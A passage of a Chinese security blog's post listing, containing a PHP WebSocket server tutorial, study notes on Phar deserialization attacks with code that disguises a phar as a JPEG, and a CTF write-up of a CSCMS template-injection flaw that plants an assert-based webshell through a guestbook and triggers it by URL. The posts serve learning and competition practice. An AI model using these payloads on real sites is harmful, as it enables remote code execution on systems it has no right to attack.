+          <h2 id="创建一个套接字"><a href="#创建一个套接字" class="headerlink" title="创建一个套接字"></a>创建一个套接字</h2><p>​        <code>socket_create</code>创建并返回一个套接字，也称作一个通讯节点。一个典型的网络连接由 2 个套接字构成，一个运行在客户端，另一个运行在服务器端。</p>
+<pre><code class="php">resource socket_create ( int $domain , int $type , int $protocol )</code></pre>
+<ul>
+<li><code>@parameter domain</code>参数指定哪个协议用在当前套接字上</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>AF_INET</code></strong></td>
+<td>IPv4 网络协议。TCP 和 UDP 都可使用此协议。</td>
+</tr>
+<tr>
+<td><strong><code>AF_INET6</code></strong></td>
+<td>IPv6 网络协议。TCP 和 UDP 都可使用此协议。</td>
+</tr>
+<tr>
+<td><strong><code>AF_UNIX</code></strong></td>
+<td>本地通讯协议。具有高性能和低成本的 IPC（进程间通讯）。</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>@parameter type</code>参数用于选择套接字使用的类型</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>SOCK_STREAM</code></strong></td>
+<td>提供一个顺序化的、可靠的、全双工的、基于连接的字节流。支持数据传送流量控制机制。TCP 协议即基于这种流式套接字。</td>
+</tr>
+<tr>
+<td><strong><code>SOCK_DGRAM</code></strong></td>
+<td>提供数据报文的支持。(无连接，不可靠、固定最大长度).UDP协议即基于这种数据报文套接字。</td>
+</tr>
+<tr>
+<td><strong><code>SOCK_SEQPACKET</code></strong></td>
+<td>提供一个顺序化的、可靠的、全双工的、面向连接的、固定最大长度的数据通信；数据端通过接收每一个数据段来读取整个数据包。</td>
+</tr>
+<tr>
+<td><strong><code>SOCK_RAW</code></strong></td>
+<td>提供读取原始的网络协议。这种特殊的套接字可用于手工构建任意类型的协议。一般使用这个套接字来实现 ICMP 请求（例如 ping）。</td>
+</tr>
+<tr>
+<td><strong><code>SOCK_RDM</code></strong></td>
+<td>提供一个可靠的数据层，但不保证到达顺序。一般的操作系统都未实现此功能。</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>@parameter protocol</code>是设置指定 <code>domain</code> 套接字下的具体协议。这个值可以使用 <a href="http://php.net/manual/zh/function.getprotobyname.php" target="_blank" rel="noopener">getprotobyname()</a> 函数进行读取。如果所需的协议是 TCP 或 UDP，可以直接使用常量 <code>SOL_TCP</code> 和 <code>SOL_UDP</code> 。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>icmp</td>
+<td>Internet Control Message Protocol 主要用于网关和主机报告错误的数据通信。例如“ping”命令（在目前大部分的操作系统中）就是使用 ICMP 协议实现的。</td>
+</tr>
+<tr>
+<td>udp</td>
+<td>User Datagram Protocol 是一个无连接的、不可靠的、具有固定最大长度的报文协议。由于这些特性，UDP 协议拥有最小的协议开销。</td>
+</tr>
+<tr>
+<td>tcp</td>
+<td>Transmission Control Protocol 是一个可靠的、基于连接的、面向数据流的全双工协议。TCP  能够保障所有的数据包是按照其发送顺序而接收的。如果任意数据包在通讯时丢失，TCP  将自动重发数据包直到目标主机应答已接收。因为可靠性和性能的原因，TCP 在数据传输层使用 8bit 字节边界。因此，TCP  应用程序必须允许传送部分报文的可能。</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>返回值</code>socket_create() 正确时返回一个套接字，失败时返回 <code>FALSE</code>。要读取错误代码，可以调用 <a href="http://php.net/manual/zh/function.socket-last-error.php" target="_blank" rel="noopener">socket_last_error()</a>。这个错误代码可以通过 <a href="http://php.net/manual/zh/function.socket-strerror.php" target="_blank" rel="noopener">socket_strerror()</a> 读取文字的错误说明。</li>
+</ul>
+<hr>
+<p>  <code>socket_bind</code>给套接字绑定名字,<strong>注意：</strong>绑定 <code>address</code> 到 <code>socket</code>。   该操作必须是在使用 <a href="https://www.php.net/manual/zh/function.socket-connect.php" target="_blank" rel="noopener">socket_connect()</a> 或者 <a href="https://www.php.net/manual/zh/function.socket-listen.php" target="_blank" rel="noopener">socket_listen()</a>   建立一个连接之前。  </p>
+<pre><code class="php"> socket_bind ( resource $socket , string $address [, int $port = 0 ] ) : bool</code></pre>
+<ul>
+<li><p><code>@parameter socket</code>用 <a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create()</a> 创建的一个有效的套接字资源。      </p>
+</li>
+<li><p><code>@parameter address</code></p>
+<ul>
+<li>如果套接字是 <strong><code>AF_INET</code></strong> 族，那么       <code>address</code> 必须是一个四点分法的 IP 地址（例如 <em>127.0.0.1</em> ）。</li>
+<li>如果套接字是 <strong><code>AF_UNIX</code></strong> 族，那么 <code>address</code> 是 Unix 套接字一部分（例如 /tmp/my.sock ）</li>
+</ul>
+</li>
+<li><p><code>@parameter port</code>参数 <code>port</code> 仅仅用于 <strong><code>AF_INET</code></strong>       套接字连接的时候，并且指定连接中需要监听的端口号。      </p>
+</li>
+</ul>
+<hr>
+<p>  ​    <code>socket_listen</code>监听socket连接</p>
+<pre><code class="php"> socket_listen ( resource $socket [, int $backlog = 0 ] ) : bool</code></pre>
+<ul>
+<li><code>@parameter socket</code>用 <a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create()</a> 创建的一个有效的套接字资源。</li>
+<li><code>@parameter backlog</code>端口号</li>
+</ul>
+<h2 id="创建套接字实例"><a href="#创建套接字实例" class="headerlink" title="创建套接字实例"></a>创建套接字实例</h2><pre><code class="php">public function service(){
+    $tcp = getprotobyname(&quot;tcp&quot;);    //获取tcp协议号码。
+    $sock = socket_create(AF_INET, SOCK_STREAM, $tcp);//创建一个套接字
+    socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
+    if($sock &lt; 0)
+    {
+        throw new Exception(&quot;failed to create socket: &quot;.socket_strerror($sock).&quot;\n&quot;);//获取错误
+    }
+    socket_bind($sock, $this-&gt;address, $this-&gt;port);//绑定IP和端口
+    socket_listen($sock, $this-&gt;port);//监听端口
+    echo &quot;listen on $this-&gt;address $this-&gt;port ... \n&quot;;
+    $this-&gt;_sockets = $sock;
+}</code></pre>
+<h2 id="握手处理"><a href="#握手处理" class="headerlink" title="握手处理"></a>握手处理</h2><ul>
+<li>我们直接从代码示例看,这个类方法传入了两个参数，一个是socket、一个是请求包，在接收到请求包后会遍历这个请求包，获取中的<code>Sec-WebSocket-Key&#39;</code>,<code>Sec-WebSocket-Key</code> 加上一个特殊字符串  <code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>，然后计算 SHA-1 ，之后进行 BASE-64  编码，将结果做为 <code>Sec-WebSocket-Accept</code> 头的值并且插入在响应包中 返回给客户端。</li>
+<li><code>socket_write</code> 将字符串写入socket中</li>
+</ul>
+<pre><code class="php">socket_write( resource `$socket`   , string `$buffer`   [, int `$length` = 0  ] ) : int</code></pre>
+<pre><code class="php">/**
+ * 握手处理
+ * @param $newClient socket
+ * @return int  接收到的信息
+ */
+public function handshaking($newClient, $line){
+
+    $headers = array();
+    $lines = preg_split(&quot;/\r\n/&quot;, $line);
+    foreach($lines as $line)
+    {
+        $line = chop($line);//chop()若为空则移除\n\r空格之类的。
+        if(preg_match(&#39;/\A(\S+): (.*)\z/&#39;, $line, $matches))//正则获取header头
+        {
+            $headers[$matches[1]] = $matches[2];//将header存入数组
+        }
+    }
+    $secKey = $headers[&#39;Sec-WebSocket-Key&#39;];
+    $secAccept = base64_encode(pack(&#39;H*&#39;, sha1($secKey . &#39;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#39;)));
+    $upgrade  = &quot;HTTP/1.1 101 Web Socket Protocol Handshake\r\n&quot; .
+        &quot;Upgrade: websocket\r\n&quot; .
+        &quot;Connection: Upgrade\r\n&quot; .
+        &quot;WebSocket-Origin: $this-&gt;address\r\n&quot; .
+        &quot;WebSocket-Location: ws://$this-&gt;address:$this-&gt;port/websocket/websocket\r\n&quot;.
+        &quot;Sec-WebSocket-Accept:$secAccept\r\n\r\n&quot;;  //构造响应包
+    return socket_write($newClient, $upgrade, strlen($upgrade));
+}</code></pre>
+<h2 id="Websocket的数据处理"><a href="#Websocket的数据处理" class="headerlink" title="Websocket的数据处理"></a>Websocket的数据处理</h2><ul>
+<li><p><strong>数据帧格式</strong></p>
+<p>​    WebSocket客户端，服务端通信的最小单位是帧（frame）,由一个或多个帧组成一条完整的消息(message)</p>
+</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191205/15755606535758.png" alt="img"></p>
+<ul>
+<li><strong>数据帧格式详解</strong>：</li>
+</ul>
+<p><strong>FIN</strong></p>
+<p>​        如果是1，表示这是消息(message)的最后一个分片（fragment）,如果是0，表示不是消息（message）的最后一个分片（fragment）</p>
+<p><strong>Opcode</strong>: </p>
+<p>​            4个比特。</p>
+<p><strong>操作码</strong></p>
+<p>​        Opcode的值决定了应该如何解析后续的数据载荷（data payload）。如果操作码是不认识的，那么接收端应该断开连接（fail the connection）</p>
+<p><strong>Mask</strong>: 1个比特。</p>
+<p>​        从客户端向服务端发送数据时，需要对数据进行掩码操作；从服务端向客户端发送数据时，不需要对数据进行掩码操作。<br>如果服务端接收到的数据没有进行过掩码操作，服务端需要断开连接。</p>
+<p><strong>Payload length</strong>: 数据载荷的长度。 7位  或  7 + 16 位  或  7 + 64位。</p>
+<p>​    假设 Payload length == x</p>
+<p>x 为 0-126： 数据长度为x字节.<br>x 为 126 ： 后续2个字节代表一个16位无符号整数<br>x  为 127 ： 后续8个字节代表一个64位无符号整数</p>
+<p><strong>掩码算法</strong>：</p>
+<p> 首先，假设：</p>
+<pre><code>original-octet-i：为原始数据的第i字节。
+transformed-octet-i：为转换后的数据的第i字节。
+j：为i mod 4的结果。
+masking-key-octet-j：为mask key第j字节。
+
+算法描述为： original-octet-i 与 masking-key-octet-j 异或后，得到 transformed-octet-i。</code></pre><ul>
+<li>数据帧的解析如下：</li>
+</ul>
+<pre><code class="php">/**
+     * 解析接收数据
+     * @param $buffer
+     * @return null|string
+     */
+    public function message($buffer){
+        $len = $masks = $data = $decoded = null;
+        $len = ord($buffer[1]) &amp; 127;//取出第8-15位
+        if ($len === 126)  { // 126&lt;=数据长度&lt;= 65535   Extended payload length 有 占用2个字节
+            $masks = substr($buffer, 4, 4);//帧格式 Masking-key 占用4字节
+            $data = substr($buffer, 8);//第九个字节（索引 8 ）开始 是数据
+        } else if ($len === 127)  { // 65535 &lt;= 数据长度  ；Extended payload length 有 占用8个字节
+            $masks = substr($buffer, 10, 4);// 说明 Extended payload length 占用 8个字节 2 + 8 所以从 10开始
+            $data = substr($buffer, 14);
+        } else  {
+            $masks = substr($buffer, 2, 4);
+            $data = substr($buffer, 6);
+        }
+        for ($index = 0; $index &lt; strlen($data); $index++) {
+            $decoded .= $data[$index] ^ $masks[$index % 4];//掩码转换为原文
+        }
+        return $decoded;  
+    }
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d3e1694f0d.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d3e1694f0d.html" class="post-title-link" itemprop="url">Phar反序列化拓展攻击学习笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-12-12 11:31:04" itemprop="dateCreated datePublished" datetime="2019-12-12T11:31:04+08:00">2019-12-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:28:02" itemprop="dateModified" datetime="2020-10-14T17:28:02+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h2><blockquote>
+<p>Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。此外，PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行phar存档。 Phar有点像PHP应用程序的拇指驱动器。（译文）</p>
+</blockquote>
+<ul>
+<li>简单理解就是他类似zip或者说类似jar，它将PHP文件打包成一个文件然后PHP可以在不解压的情况去访问这个包里面的php，并执行。<h3 id="Phar的结构"><a href="#Phar的结构" class="headerlink" title="Phar的结构"></a>Phar的结构</h3></li>
+</ul>
+<p><strong>1.</strong> <strong>phar文件标识</strong></p>
+<pre><code class="php">&lt;?php
+Phar::mapPhar();
+include &#39;phar://phar.phar/index.php&#39;;
+__HALT_COMPILER();
+?&gt;</code></pre>
+<p>​        格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<p><strong>2. a manifest describing the contents</strong><br>         phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
+<p><strong>3. the file contents</strong><br>         被压缩文件的内容。</p>
+<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong><br>         签名，放在文件末尾，格式如下：    </p>
+<h3 id="Phar的使用方法"><a href="#Phar的使用方法" class="headerlink" title="Phar的使用方法"></a>Phar的使用方法</h3><pre><code class="php">&lt;?php
+    class User{
+        var $name;
+        function __destruct(){
+            echo &quot;fangzhang&quot;;
+        }
+    }
+
+    @unlink(&quot;test.phar&quot;);
+    $phar = new Phar(&quot;test.phar&quot;);//后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub
+    $o = new User();
+    $o-&gt;name = &quot;test&quot;;
+    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//添加要压缩的文件
+    $phar-&gt;stopBuffering();
+?&gt;</code></pre>
+<p>得到的test.phar 内容如下：</p>
+<pre><code>00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM
+00000010: 5049 4c45 5228 293b 203f 3e0d 0a5b 0000  PILER(); ?&gt;..[..
+00000020: 0001 0000 0011 0000 0001 0000 0000 0025  ...............%
+00000030: 0000 004f 3a34 3a22 5573 6572 223a 313a  ...O:4:&quot;User&quot;:1:
+00000040: 7b73 3a34 3a22 6e61 6d65 223b 733a 343a  {s:4:&quot;name&quot;;s:4:
+00000050: 2274 6573 7422 3b7d 0800 0000 7465 7374  &quot;test&quot;;}....test
+00000060: 2e74 7874 0400 0000 46fc 6e5d 0400 0000  .txt....F.n]....
+00000070: 0c7e 7fd8 b601 0000 0000 0000 7465 7374  .~..........test
+00000080: 9d18 4c48 ba24 6ed6 a810 3690 2aac 034e  ..LH.$n...6.*..N
+00000090: 6aee e818 0200 0000 4742 4d42            j.......GBMB</code></pre><p>可以看到，有一部分是序列化之后的内容，就是我们在上一部分所说的<code>manifest</code>也就是<code>meta-data</code></p>
+<h3 id="Phar反序列化原理"><a href="#Phar反序列化原理" class="headerlink" title="Phar反序列化原理"></a>Phar反序列化原理</h3><p>​        使用Phar://伪协议去读取Phar文件时候，文件会被当做phar对象，meta-data部分会被反序列化。</p>
+<h4 id="测试Dome"><a href="#测试Dome" class="headerlink" title="测试Dome"></a>测试Dome</h4><pre><code class="php">&lt;?php
+    class User{
+        var $name;
+        function __destruct(){
+            echo &quot;test&quot;;
+        }
+    }
+
+$file = &quot;phar://test.phar&quot;;
+@file_get_contents($file);
+?&gt;</code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="函数扩展"><a href="#函数扩展" class="headerlink" title="函数扩展"></a>函数扩展</h3><p>根据以上代码的测试可知，只要phar://协议解析文件的时候，就会造成序列化的问题，类似这样的函数不光有<code>file_get_contents</code>还有其他函数；</p>
+<p>有大牛曾经总结过，所有文件操作的函数都可以触发这种序列化：</p>
+<ul>
+<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
+<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
+<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / `fopen``</li>
+<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
+<li><code>parse_ini_file</code></li>
+<li><code>unlink</code></li>
+<li><code>copy</code></li>
+</ul>
+<p>还有大牛深入的分析过这些函数的原理，并且加以扩展：</p>
+<ul>
+<li><code>exif_thumbnail</code></li>
+<li><code>exif_imagetype</code></li>
+<li><code>imageloadfont</code></li>
+<li><code>imagecreatefrom***</code></li>
+<li><code>hash_hmac_file</code></li>
+<li><code>hash_file</code></li>
+<li><code>hash_update_file</code></li>
+<li><code>md5_file</code></li>
+<li><code>sha1_file</code></li>
+<li><code>get_meta_tags</code></li>
+<li><code>get_headers</code></li>
+<li><code>getimagesize</code></li>
+<li><code>getimagesizefromstring</code></li>
+</ul>
+<p>几乎所有和IO有关的函数都涉及到了</p>
+<h3 id="绕过图片头检查"><a href="#绕过图片头检查" class="headerlink" title="绕过图片头检查"></a>绕过图片头检查</h3><pre><code class="php">&lt;?php
+class TestObject {}
+
+$jpeg_header_size = 
+&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;.
+&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;.
+&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;.
+&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;.
+&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;.
+&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;.
+&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;.
+&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;.
+&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;.
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;.
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;.
+&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;;
+
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);
+$phar-&gt;setStub($jpeg_header_size.&quot; __HALT_COMPILER(); ?&gt;&quot;);
+$o = new TestObject();
+$phar-&gt;setMetadata($o);
+$phar-&gt;stopBuffering();</code></pre>
+<h3 id="限制使用phar：-出现位置"><a href="#限制使用phar：-出现位置" class="headerlink" title="限制使用phar：//出现位置"></a>限制使用phar：//出现位置</h3><pre><code class="php">$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d458a3f373.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d458a3f373.html" class="post-title-link" itemprop="url">复现强网杯线下赛CSCMS--SSIT模板注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-29 22:22:35" itemprop="dateCreated datePublished" datetime="2019-11-29T22:22:35+08:00">2019-11-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:16:51" itemprop="dateModified" datetime="2020-10-14T17:16:51+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>731</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>漏洞存在于：<code>\app\models\Csskins.php</code></p>
+<ul>
+<li><code>cscms_php</code>这个类方法中存在代码执行，：</li>
+</ul>
+<pre><code class="php">    // php标签处理
+    public function cscms_php($php,$content,$str) {
+        $evalstr=&quot; return $content&quot;;
+        $newsphp=eval($evalstr);
+        $str=str_replace($php,$newsphp,$str);
+        return $str;
+    }</code></pre>
+<ul>
+<li>我们追踪<code>cscms_php</code>在<code>template_parse</code>这个方法中进行了调用，但是这里进行了过滤，这样类型的是可以执行的：<code>{cscmsphp}phpinfo();{/cscmsphp}</code>追踪<code>$str</code>是<code>template_parse</code>的传入参数，我们再继续追踪<code>template_parse</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/1575037851193.png" alt="img"></p>
+<ul>
+<li>经过一段时间的查找，<code>gbook_list</code>类方法调用了<code>template_parse</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750381995978.png" alt="img"></p>
+<ul>
+<li>我们追踪<code>$Mark_Text</code>发现它是由<code>$data_content</code>经过替换得到。那么我们继续追踪<code>$data_content</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750384557070.png" alt="img"></p>
+<ul>
+<li>从下面代码我们可以简单知道<code>$data_content</code>是由一个数组得到的，而这个数组是通过查询数据库得到的。这里就可以得到一个思路，就是通过留言板把payload写入数据库，而后<code>gbook_list</code>会把payload拿出来去渲染，因为这里无论内容有哪些最终在传到<code>cscms_php</code>这个类方法时候都会获取到payload。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750386263446.png" alt="img"></p>
+<ul>
+<li>留言处插入如下payload</li>
+</ul>
+<pre><code>{cscmsphp}assert($_REQUEST[pwd]);{/cscmsphp}</code></pre><ul>
+<li>访问：</li>
+</ul>
+<pre><code>http://www.tp5.com/index.php/gbook/lists/1?pwd=phpinfo();</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750393335223.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d68bf56e4f.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d68bf56e4f.html" class="post-title-link" itemprop="url">红帽杯线下部分 writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-22 22:28:47" itemprop="dateCreated datePublished" datetime="2019-11-22T22:28:47+08:00">2019-11-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:09:52" itemprop="dateModified" datetime="2020-10-14T17:09:52+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
